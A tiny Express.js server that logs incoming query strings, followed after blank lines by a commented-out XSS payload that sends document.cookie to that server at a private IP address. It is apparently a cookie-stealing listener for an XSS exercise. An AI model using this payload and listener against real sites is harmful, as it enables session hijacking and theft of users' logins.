const express = require('express')
const app = express()
const port = 3000

app.get('/', (req, res) => {
    console.log(req.query)
  res.send('Hello World!')
})

app.listen(port, () => {
  console.log(`Example app listening on port ${port}`)
})









{/* <script>fetch('http://192.168.0.107:3000?cookie='+ document.cookie)</script> */}